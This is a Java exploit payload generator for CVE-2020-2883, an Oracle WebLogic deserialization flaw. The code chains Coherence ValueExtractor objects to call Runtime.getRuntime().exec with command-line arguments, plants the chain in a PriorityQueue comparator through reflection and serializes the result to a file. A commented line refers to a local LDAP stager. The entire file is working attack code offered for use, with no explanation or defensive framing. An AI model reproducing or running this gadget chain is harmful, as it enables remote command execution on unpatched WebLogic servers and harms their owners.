package com._51pwn.CVE_2020_2883;

import com._51pwn.tools.Tools;
import com.tangosol.coherence.reporter.extractor.ConstantExtractor;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.comparator.ExtractorComparator;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;

import java.lang.reflect.Field;
import java.util.PriorityQueue;

// CVE-2020-2883
// https://github.com/huakaii/huakai.github.io/blob/14f4ce2b2d3e5390dfa8ecf318b5e7525d991f24/docs/papers/java/weblogic/CVE-2020-2883.md
//    weblogic 10.3.6.0
// weblogic 12.1.3.0
// weblogic 12.2.1.4
// weblogic 14.1.1.0.0
public class Main {
    public static void main(String[] args) throws Exception {
        String ldap = args[1];//"ldap://docker.for.mac.localhost:1389/UpX34defineClass";
        // 未后续 操作 方法 getDatabaseMetaData 进行定义
        ValueExtractor[] valueExtractors = new ValueExtractor[]{
                new ConstantExtractor(Runtime.class),
                new ReflectionExtractor("getMethod", new Object[]{"getRuntime", new Class[0]}),
                new ReflectionExtractor("invoke", new Object[]{null, new Object[0]}),
                new ReflectionExtractor("exec", new Object[]{new String[]{args[0], args[1], args[2]}})
        };

        ChainedExtractor chainedExtractor = new ChainedExtractor(valueExtractors);

        ExtractorComparator extractorComparator = new ExtractorComparator<Object>();
        Field m_extractor = extractorComparator.getClass().getDeclaredField("m_extractor");
        m_extractor.setAccessible(true);
        m_extractor.set(extractorComparator, chainedExtractor);

        PriorityQueue priorityQueue = new PriorityQueue();
        priorityQueue.add("foo");
        priorityQueue.add("bar");

        Field comparator = priorityQueue.getClass().getDeclaredField("comparator");
        comparator.setAccessible(true);
        comparator.set(priorityQueue, extractorComparator);

        Tools.WtOo1(priorityQueue);
        System.out.println("write ok");
    }
}
